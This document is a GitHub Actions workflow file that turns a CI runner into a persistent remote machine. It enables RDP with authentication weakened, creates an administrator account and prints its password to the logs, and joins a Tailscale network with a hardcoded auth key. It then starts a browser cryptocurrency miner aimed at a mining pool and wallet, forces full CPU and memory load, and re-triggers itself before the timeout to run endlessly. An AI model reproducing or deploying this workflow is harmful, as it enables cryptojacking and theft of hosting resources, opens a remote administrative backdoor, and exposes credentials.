name: RDP-Auto-Rebuild

on:
  workflow_dispatch:

jobs:
  rdp:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Enable & Configure RDP
        shell: pwsh
        run: |
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
            -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
            -Name "UserAuthentication" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-TCP" 2>$null
          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389
          Restart-Service TermService -Force

      - name: Create RDP User
        shell: pwsh
        run: |
          Add-Type -AssemblyName System.Security
          $chars = @{
              U=[char[]](65..90);
              L=[char[]](97..122);
              N=[char[]](48..57);
              S=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))
          }
          $p=@()
          $p+= $chars.U | Get-Random -Count 4
          $p+= $chars.L | Get-Random -Count 4
          $p+= $chars.N | Get-Random -Count 4
          $p+= $chars.S | Get-Random -Count 4
          $password = -join ($p | Sort-Object {Get-Random})
          $secure = ConvertTo-SecureString $password -AsPlainText -Force
          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) { Remove-LocalUser -Name "RDP" }
          New-LocalUser -Name "RDP" -Password $secure -AccountNeverExpires
          Add-LocalGroupMember -Group Administrators -Member RDP
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member RDP
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      - name: Install Tailscale
        shell: pwsh
        run: |
          $url="https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $f="$env:TEMP\tailscale.msi"
          Invoke-WebRequest $url -OutFile $f
          Start-Process msiexec.exe -ArgumentList "/i `"$f`" /quiet /norestart" -Wait
          Remove-Item $f -Force

      - name: Connect Tailscale
        shell: pwsh
        run: |
          $tsExe="$env:ProgramFiles\Tailscale\tailscale.exe"
          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" `
            --hostname runner-$env:GITHUB_RUN_ID --reset

          $ip=$null
          for ($i=1; $i -le 10; $i++) {
            $ip = & $tsExe ip -4
            if ($ip) { break }
            Start-Sleep 5
          }
          if (-not $ip) { Write-Error "No Tailscale IP"; exit 1 }
          echo "TS_IP=$ip" >> $env:GITHUB_ENV

      - name: Start WebMiner
        shell: pwsh
        run: |
          $url="https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" `
            -ArgumentList "--new-window","--app=$url"
          Write-Host "WebMiner started."

      - name: Max Resource Usage (Full CPU + RAM Load)
        shell: pwsh
        run: |
          Write-Host "Starting MAX CPU + RAM usage..."
          $cores = (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors
          Write-Host "Cores detected: $cores"
          for ($i=0; $i -lt $cores; $i++) {
            Start-Job -ScriptBlock {
              while ($true) { 1..50000 | ForEach-Object { $_ * $_ } }
            }
          }
          $memArray = @()
          while ($true) {
            $memArray += "X" * 50000000
            Start-Sleep -Milliseconds 500
          }

      - name: Print Connection Info
        shell: pwsh
        run: |
          Write-Host "==============================="
          Write-Host "   RDP SESSION DETAILS"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: RDP"
          Write-Host "Password: $env:RDP_PASSWORD"
          Write-Host "==============================="

      - name: Auto-Rebuild Before Timeout
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          $limit = 350
          for ($i=1; $i -le $limit; $i++) {
            Write-Host "[$(Get-Date)] Session alive ($i/$limit)"
            Start-Sleep -Seconds 60
          }
          Write-Host "Rebuilding session..."
          gh workflow run $env:GITHUB_WORKFLOW --ref $env:GITHUB_REF_NAME --repo $env:GITHUB_REPOSITORY
          Start-Sleep -Seconds 20
          exit 0
